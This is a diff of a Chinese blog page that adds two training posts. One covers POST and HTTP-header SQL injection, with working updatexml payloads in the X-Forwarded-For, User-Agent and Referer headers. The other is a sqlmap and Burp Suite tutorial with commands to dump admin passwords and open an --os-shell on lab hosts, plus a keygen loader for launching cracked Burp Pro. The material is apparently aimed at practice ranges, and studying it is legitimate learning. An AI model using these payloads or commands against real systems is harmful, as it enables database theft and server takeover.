@@ -129,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -140,7 +140,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -169,6 +169,319 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="宋卫冬的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">post注入和head注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-29 20:12:25" itemprop="dateCreated datePublished" datetime="2021-11-29T20:12:25+08:00">2021-11-29</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-11-30 02:09:56" itemprop="dateModified" datetime="2021-11-30T02:09:56+08:00">2021-11-30</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="一、POST注入介绍"><a href="#一、POST注入介绍" class="headerlink" title="一、POST注入介绍"></a>一、POST注入介绍</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">注入攻击的本质，是把用户输入的数据当做代码执行。</span><br><span class="line"></span><br><span class="line">这里有两个关键条件：</span><br><span class="line">第一个是用户能够控制输入</span><br><span class="line">第二个是原本程序要执行的代码，拼接了用户输入的数据</span><br><span class="line"></span><br><span class="line">POST注入属于注入的一种，相信大家在之前的课程中都知道POST\GET两种传参方式。</span><br><span class="line">POST注入就是使用POST进行传参的注入，本质上和GET类型的没什么区别</span><br><span class="line"></span><br><span class="line">POST注入高危点：</span><br><span class="line">登录框</span><br><span class="line">查询框</span><br><span class="line">等各种和数据库有交互的框</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211129201747212.png" alt="image-20211129201747212"></p>
+<h2 id="二、POST注入靶场的做法"><a href="#二、POST注入靶场的做法" class="headerlink" title="二、POST注入靶场的做法"></a>二、POST注入靶场的做法</h2><p>闭合 与 and之间有一个空格</p>
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211129201807045.png" alt="image-20211129201807045"></p>
+<h3 id="sqlmap跑post注入"><a href="#sqlmap跑post注入" class="headerlink" title="sqlmap跑post注入"></a>sqlmap跑post注入</h3><h4 id="1、–form"><a href="#1、–form" class="headerlink" title="1、–form"></a>1、–form</h4><p>自动检测表单 （Form）</p>
+<h4 id="2、-r-抓包跑"><a href="#2、-r-抓包跑" class="headerlink" title="2、-r 抓包跑"></a>2、-r 抓包跑</h4><p>（此方法推荐）</p>
+<p>开代理使用burp抓一个包</p>
+<p>POST注入（一）输入用户名 和密码抓一个包</p>
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211129204550504.png" alt="image-20211129204550504"></p>
+<p>将抓包的内容复制到1.txt，如果测出来usernam处有注入，就在那里加个*</p>
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211129210145987-16381909076601.png" alt="image-20211129210145987"></p>
+<p>放到sqlmap目录下，y</p>
+<p>要不然sqlmap找不到</p>
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211129204915463.png" alt="image-20211129204915463"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 2</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p>时间性盲注</p>
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211129210626358.png" alt="image-20211129210626358"></p>
+<h2 id="三、Head注入介绍"><a href="#三、Head注入介绍" class="headerlink" title="三、Head注入介绍"></a>三、Head注入介绍</h2><p>Head注入 换了一种传参方式而已</p>
+<h4 id="请求头（Header）是什么？"><a href="#请求头（Header）是什么？" class="headerlink" title="请求头（Header）是什么？"></a>请求头（Header）是什么？</h4><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h2 id="四、HEAD注入靶场的做法"><a href="#四、HEAD注入靶场的做法" class="headerlink" title="四、HEAD注入靶场的做法"></a>四、HEAD注入靶场的做法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#x27; and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),123) -- qwe</span><br></pre></td></tr></table></figure>
+
+<p>Pass-09</p>
+<p>User-Agent</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select database())),1),123) -- qwe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211130014025219.png" alt="image-20211130014025219"></p>
+<p>Pass-09</p>
+<p>referer全部替换为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),123) -- qwe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211130013757326.png" alt="image-20211130013757326"></p>
+<p>Pass-09</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#x27; or updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),123) -- qwe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/29/post%E6%B3%A8%E5%85%A5%E5%92%8Chead%E6%B3%A8%E5%85%A5/image-20211130013448192.png" alt="image-20211130013448192"></p>
+<h2 id="作业："><a href="#作业：" class="headerlink" title="作业："></a>作业：</h2>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="宋卫冬的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">渗透测试常用工具</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-27 14:19:19" itemprop="dateCreated datePublished" datetime="2021-11-27T14:19:19+08:00">2021-11-27</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-11-30 02:10:21" itemprop="dateModified" datetime="2021-11-30T02:10:21+08:00">2021-11-30</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]</p>
+<ul>
+<li><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211127145149071.png" alt="image-20211127145149071"></li>
+</ul>
+<h3 id="Sqlmap环境："><a href="#Sqlmap环境：" class="headerlink" title="Sqlmap环境："></a>Sqlmap环境：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2.7必须</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sqlmap安装"><a href="#Sqlmap安装" class="headerlink" title="Sqlmap安装"></a>Sqlmap安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python默认路径：C:\Python27</span><br></pre></td></tr></table></figure>
+
+<p>  <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%5Cpython-2.7.18.amd64.msi">python-2.7.18.amd64.msi</a> </p>
+<p>  <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%5Csqlmap%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC.bat">sqlmap启动脚本.bat</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Python27\sqlmap-master</span><br><span class="line">python &quot;C:\Python27\sqlmap-master\sqlmap.py&quot; %*</span><br><span class="line">cmd rem 注释：防止退出</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Sqlmap使用"><a href="#Sqlmap使用" class="headerlink" title="Sqlmap使用"></a>Sqlmap使用</h3><p>Sqlmap 是用的最为广泛的自动化检测、利用SQL注入的渗透测试工具，支持多种数据库。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+<p>下载好后直接解压，并且加入环境变量，就可以直接在cmd调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常用最基础指令：</span><br><span class="line">-u 指定注入点</span><br><span class="line">--dbs 跑库名</span><br><span class="line">--tables 跑表名</span><br><span class="line">--columns 跑字段名</span><br><span class="line">--dump 枚举数据(很危险，容易出事)</span><br><span class="line">-D 指定库 -T 指定表 -C 指定字段</span><br><span class="line">python sqlmap.py -u http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1 -D maoshe -T admin -C</span><br><span class="line"> password --dump</span><br></pre></td></tr></table></figure>
+
+<p>超详细Sqlmap指令手册：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hongfei/p/3872156.html">https://www.cnblogs.com/hongfei/p/3872156.html</a></p>
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211127151605002.png" alt="image-20211127151605002"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://inject2b.lab.aqlab.cn/Pass-01/index.php?id=1 --is-dba</span><br></pre></td></tr></table></figure>
+
+<p>–is-dba 表示当前的注入点的用户是什么权限</p>
+<p>（DBA 是database admin 的缩写，表示数据库管理员）</p>
+<p>current user is DBA: False （false表示当前注入点的用户不是dba权限）</p>
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211128143605080.png" alt="image-20211128143605080"></p>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://59.63.200.79:8001/single.php?id=1 --os-shell</span><br></pre></td></tr></table></figure>
+
+<p>这是kali公开课的靶场，通过Sqlmap直接获得服务器权限</p>
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211128151607880.png" alt="image-20211128151607880"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">web服务器支持哪种web应用程序语言?</span><br><span class="line">[1] ASP</span><br><span class="line">[2] ASPX</span><br><span class="line">[3] JSP</span><br><span class="line">[4] PHP(默认)</span><br><span class="line">默认回车就可以，</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211128151919094.png" alt="image-20211128151919094"></p>
+<p>机器返回os-shell 然后就可以输入cmd命令，使用whoami可以查看当前用户的权限</p>
+<p>cmd命令</p>
+<p>dir 显示目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami </span><br><span class="line">nono yes</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211128155525812.png" alt="image-20211128155525812"></p>
+<h4 id="使用–proxy-代理"><a href="#使用–proxy-代理" class="headerlink" title="使用–proxy 代理"></a>使用–proxy 代理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd:</span><br><span class="line">python sqlmap.py -u http://inject2b.lab.aqlab.cn/Pass-03/index.php?id=1 --proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p>1.打开sqlmap，输入上面的指令。</p>
+<p>2.burp点击抓包</p>
+<p>3.sqlmap回车执行命令</p>
+<p>通过点击burp的forward可以看到sqlmap执行了发送了那些数据。</p>
+<h3 id="BurpSuit安装"><a href="#BurpSuit安装" class="headerlink" title="BurpSuit安装"></a>BurpSuit安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</span><br></pre></td></tr></table></figure>
+
+<p>​    我们先进行安装把工具装好，如果遇到破解问题可以看我的帖子<br>​    <a target="_blank" rel="noopener" href="https://www.zkaq.org/t/2178.html">https://www.zkaq.org/t/2178.html</a></p>
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211127151724796.png" alt="image-20211127151724796">简单操作：如何抓包，如何抓返回包，如何单放包且查看返回包</p>
+<h4 id="设置bat启动"><a href="#设置bat启动" class="headerlink" title="设置bat启动"></a>设置bat启动</h4><p>如果没有启动失败，这是权限不够的问题。可以到quicker的安装位置给予管理员启动权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line">SET JAVA_HOME=C:\Program Files\Java\jre1.8.0_211</span><br><span class="line">SET PATH=%JAVA_HOME%\bin</span><br><span class="line">SET CLASSPATH= .;%JAVA_HOME%\lib</span><br><span class="line">START javaw -jar -Xbootclasspath/p:burp-loader-keygen.jar burpsuite_pro_v1.7.30.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211129020810069.png" alt="image-20211129020810069"></p>
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211129021525042.png" alt="image-20211129021525042"></p>
+<h3 id="BurpSuit使用"><a href="#BurpSuit使用" class="headerlink" title="BurpSuit使用"></a>BurpSuit使用</h3><ul>
+<li><h4 id><a href="#" class="headerlink" title></a></h4></li>
+</ul>
+<ul>
+<li><h4 id="跑包演示"><a href="#跑包演示" class="headerlink" title="跑包演示"></a>跑包演示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jemm8002.ia.aqlab.cn/d/index.asp?T=reg</span><br></pre></td></tr></table></figure>
+
+<p>1.burp开代理</p>
+<p>2.网页输入登录账户名和密码</p>
+<p>3.点击burp</p>
+<p>4.网页点击登录</p>
+<p>5.burp开始抓取数据</p>
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211129193636617.png" alt="image-20211129193636617"></p>
+</li>
+</ul>
+<img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211129194057121.png" alt="image-20211129194057121" style="zoom: 80%;">
+
+
+
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211129194353166-16381862341501.png" alt="image-20211129194353166"></p>
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211129194459345.png" alt="image-20211129194459345"></p>
+<p>出现302表示已经跑出了密码</p>
+<p><img src="/2021/11/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/image-20211129194646668.png" alt="image-20211129194646668"></p>
+<h3 id="谷歌插件"><a href="#谷歌插件" class="headerlink" title="谷歌插件"></a>谷歌插件</h3><p>谷歌浏览器下载地址：<a target="_blank" rel="noopener" href="https://www.google.cn/intl/zh-CN/chrome/">https://www.google.cn/intl/zh-CN/chrome/</a> </p>
+<p>安装浏览器插件的文章地址：<a target="_blank" rel="noopener" href="https://www.zkaq.org/t/3683.html">https://www.zkaq.org/t/3683.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">浏览器插件其实就是浏览器的扩展，我们这里讲的是google浏览器的插件，360浏览器的极速模式使用了谷歌内核，所以兼容谷歌浏览器插件</span><br><span class="line">插件可以帮助我们更好的对浏览器进行操作，例如Proxy SwitchySharp插件可以帮助我快速的使用代理</span><br></pre></td></tr></table></figure>
+
+<h3 id="易错分析"><a href="#易错分析" class="headerlink" title="易错分析"></a>易错分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">渗透测试常用工具-本课易错回答分析</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-如何安装Java环境"><a href="#1-如何安装Java环境" class="headerlink" title="\1. 如何安装Java环境"></a>\1. 如何安装Java环境</h4><p>访问<a target="_blank" rel="noopener" href="https://www.java.com/zh_CN/download/win10.jsp%E7%82%B9%E5%87%BB%E5%90%8C%E6%84%8F%E5%B9%B6%E5%BC%80%E5%A7%8B%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD">https://www.java.com/zh_CN/download/win10.jsp点击同意并开始免费下载</a></p>
+<h4 id="2-如何安装Python环境"><a href="#2-如何安装Python环境" class="headerlink" title="\2. 如何安装Python环境"></a>\2. 如何安装Python环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python 分为 2.x和3.x两个系列，如果是用sqlmap建议使用2.x这个版本</span><br><span class="line">python(2.7.18)下载地址：</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/2.7.18/python-2.7.18.amd64.msi">https://www.python.org/ftp/python/2.7.18/python-2.7.18.amd64.msi</a></p>
+<h4 id="3-Java和Python默认安装路径是什么？"><a href="#3-Java和Python默认安装路径是什么？" class="headerlink" title="\3. Java和Python默认安装路径是什么？"></a>\3. Java和Python默认安装路径是什么？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python默认路径：C:\Python27</span><br><span class="line">Java默认路径：C:\Program Files\Java\jre1.8.0_211\bin。</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-环境变量是什么？"><a href="#4-环境变量是什么？" class="headerlink" title="\4. 环境变量是什么？"></a>\4. 环境变量是什么？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境变量一般是指在操作系统中用来指定操作系统运行环境的一些参数，如果我定义了这个环境变量的路径，那么当在windows系统的变量中寻找不到的时候，就会去我添加的路径去寻找对应的东西。</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-环境变量的意义？"><a href="#5-环境变量的意义？" class="headerlink" title="\5. 环境变量的意义？"></a>\5. 环境变量的意义？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果我没有把Python加入环境变量，我在cmd中不能直接运行python,因为在系统路径里面找不到python这个东西，然后加了环境变量，于是乎就会去我添加的路径查找，然后他发现了，有一个东西交python然后调用了。</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-环境变量如何添加？"><a href="#6-环境变量如何添加？" class="headerlink" title="\6. 环境变量如何添加？"></a>\6. 环境变量如何添加？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">选择计算机属性-&gt;远程设置-&gt;高级-&gt;环境变量</span><br><span class="line"></span><br><span class="line">找到path变量值，然后编辑，然后输入;将前面的结束，然后在后面添加你想加入的路径</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/b24f6c82cba6dc86bfe5da9f.html">https://jingyan.baidu.com/article/b24f6c82cba6dc86bfe5da9f.html</a></p>
+<h4 id="7-Sqlmap哪里获取？"><a href="#7-Sqlmap哪里获取？" class="headerlink" title="\7. Sqlmap哪里获取？"></a>\7. Sqlmap哪里获取？</h4><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+<h4 id="8-Sqlmap怎么运行妮？"><a href="#8-Sqlmap怎么运行妮？" class="headerlink" title="\8. Sqlmap怎么运行妮？"></a>\8. Sqlmap怎么运行妮？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">打开cmd，然后输入python sqlmap的地址就行了</span><br><span class="line"></span><br><span class="line">例如：python E:\sqlmap-master\sqlmap.py (后面加各种指令)</span><br><span class="line"></span><br><span class="line">或者将cmd打开的目录在sqlmap.py那个目录下直接输入python sqlmap.py</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-Sqlmap那么多指令记不住怎么办？"><a href="#9-Sqlmap那么多指令记不住怎么办？" class="headerlink" title="\9. Sqlmap那么多指令记不住怎么办？"></a>\9. Sqlmap那么多指令记不住怎么办？</h4><p>可以看看手册<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hongfei/p/3872156.html">https://www.cnblogs.com/hongfei/p/3872156.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">去背指令没有任何意义，用着用着你就习惯了</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-有注入点Sqlmap一定能跑出来吗？"><a href="#10-有注入点Sqlmap一定能跑出来吗？" class="headerlink" title="\10. 有注入点Sqlmap一定能跑出来吗？"></a>\10. 有注入点Sqlmap一定能跑出来吗？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap只是一个工具而已，工具都是由局限性的，有些时候，摆明存在注入点，但是Sqlmap就是跑不出来，有些时候Sqlmap跑出来存在注入，但是跑不出库名表名就可能是误报</span><br></pre></td></tr></table></figure>
+
+<h4 id="11-在使用sqlmap-–os-shell中，找不到绝对路径怎么办"><a href="#11-在使用sqlmap-–os-shell中，找不到绝对路径怎么办" class="headerlink" title="\11. 在使用sqlmap –os-shell中，找不到绝对路径怎么办"></a>\11. 在使用sqlmap –os-shell中，找不到绝对路径怎么办</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以在对方网站进行测试使其报错，或者是找到他的一些phpinfo、探针之类的信息泄露，或者通过注入找到对方的数据库地址，然后进行猜测地址目录</span><br></pre></td></tr></table></figure>
+
+<h4 id="12-在使用sqlmap-–os-shell中，如何判断他的脚本信息？"><a href="#12-在使用sqlmap-–os-shell中，如何判断他的脚本信息？" class="headerlink" title="12.在使用sqlmap –os-shell中，如何判断他的脚本信息？"></a>12.在使用sqlmap –os-shell中，如何判断他的脚本信息？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们在对方的站点中，可以去测试他的主页，例如使用index.php,index.asp来简单判断，或者是抓包，查看他其他的链接的后缀信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="13-如何查看Python安装成功且环境变量安装成功？"><a href="#13-如何查看Python安装成功且环境变量安装成功？" class="headerlink" title="13.如何查看Python安装成功且环境变量安装成功？"></a>13.如何查看Python安装成功且环境变量安装成功？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们打开Cmd窗口输入，输入python，查看是否进入了python终端</span><br></pre></td></tr></table></figure>
+
+<h4 id="14-SqlMap中探测等级的区别？"><a href="#14-SqlMap中探测等级的区别？" class="headerlink" title="\14. SqlMap中探测等级的区别？"></a>\14. SqlMap中探测等级的区别？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；</span><br><span class="line"></span><br><span class="line">当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。</span><br></pre></td></tr></table></figure>
+
